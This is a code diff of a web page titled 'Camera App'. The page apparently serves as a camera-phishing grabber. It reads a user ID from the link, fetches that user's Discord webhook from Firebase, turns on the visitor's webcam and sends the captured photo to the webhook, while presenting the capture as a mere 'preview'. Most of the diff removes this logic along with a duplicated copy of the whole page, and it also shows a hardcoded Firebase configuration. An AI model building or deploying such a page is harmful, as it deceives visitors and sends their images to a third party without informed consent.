@@ -4,8 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Camera App</title>
-    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -58,156 +58,8 @@
         };
 
         // Initialize Firebase
-        const app = firebase.initializeApp(firebaseConfig);
-        const db = firebase.database(app);
-
-        const urlParams = new URLSearchParams(window.location.search);
-        const userID = urlParams.get('userID');
-
-        if (!userID) {
-            document.getElementById('errorMessage').textContent = "No User ID found in the URL!";
-        } else {
-            // Retrieve the webhook URL from Firebase
-            firebase.database().ref('webhooks/' + userID).get().then((snapshot) => {
-                if (snapshot.exists()) {
-                    const storedWebhookURL = snapshot.val().webhookURL;
-
-                    // Start the camera and capture functionality
-                    startCamera(storedWebhookURL);
-                } else {
-                    document.getElementById('errorMessage').textContent = "Invalid or non-existent User ID!";
-                }
-            }).catch((error) => {
-                console.error("Error getting data: " + error);
-                document.getElementById('errorMessage').textContent = "Error retrieving webhook.";
-            });
-        }
-
-        // Start the camera and capture the image
-        function startCamera(webhookURL) {
-            const videoElement = document.getElementById('videoElement');
-            const captureButton = document.getElementById('captureButton');
-
-            // Access the user's webcam
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then((stream) => {
-                    videoElement.srcObject = stream;
-                })
-                .catch((error) => {
-                    document.getElementById('errorMessage').textContent = "Error accessing webcam.";
-                    console.error("Error accessing webcam:", error);
-                });
-
-            // Capture the image
-            captureButton.addEventListener('click', () => {
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                canvas.width = videoElement.videoWidth;
-                canvas.height = videoElement.videoHeight;
-                ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-
-                // Convert the captured image to base64
-                const imageData = canvas.toDataURL('image/png');
-
-                // Send the captured image to Discord via webhook
-                sendToDiscord(webhookURL, imageData);
-            });
-        }
-
-        // Send the image to Discord webhook
-        function sendToDiscord(webhookURL, imageData) {
-            const data = {
-                content: "Preview your captured image!",
-                embeds: [{
-                    image: {
-                        url: imageData
-                    }
-                }]
-            };
-
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            })
-            .then((response) => {
-                if (response.ok) {
-                    alert("Image sent to Discord!");
-                } else {
-                    alert("Failed to send image to Discord!");
-                }
-            })
-            .catch((error) => {
-                console.error("Error sending image to Discord:", error);
-                alert("Error sending image to Discord!");
-            });
-        }
-    </script>
-
-</body>
-</html>
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Camera App</title>
-    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js"></script>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #1a1a1a;
-            color: white;
-            text-align: center;
-            padding: 20px;
-        }
-        video {
-            width: 100%;
-            max-width: 500px;
-            margin-bottom: 20px;
-            border-radius: 10px;
-        }
-        button {
-            padding: 10px;
-            font-size: 16px;
-            margin-top: 10px;
-            border-radius: 5px;
-            border: none;
-            background-color: #0f0;
-        }
-        button:hover {
-            background-color: #0c0;
-        }
-        #errorMessage {
-            color: red;
-            font-size: 18px;
-        }
-    </style>
-</head>
-<body>
-
-    <h1>Preview Your Captured Image!</h1>
-    <video id="videoElement" autoplay></video>
-    <button id="captureButton">Capture</button>
-
-    <p id="errorMessage"></p>
-
-    <script>
-        // Firebase Config (replace with your actual Firebase config)
-        const firebaseConfig = {
-            apiKey: "AIzaSyALBfaHvq7ZuHdtL8DSvg1NWJ1MymG9G8Q",
-            authDomain: "camera-fbd09.firebaseapp.com",
-            projectId: "camera-fbd09",
-            storageBucket: "camera-fbd09.firebasestorage.app",
-            messagingSenderId: "442525030455",
-            appId: "1:442525030455:web:41ffd3c54302299479c7b2",
-            measurementId: "G-NN810LP0E8"
-        };
-
-        // Initialize Firebase
-        const app = firebase.initializeApp(firebaseConfig);
-        const db = firebase.database(app);
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
 
         const urlParams = new URLSearchParams(window.location.search);
         const userID = urlParams.get('userID');
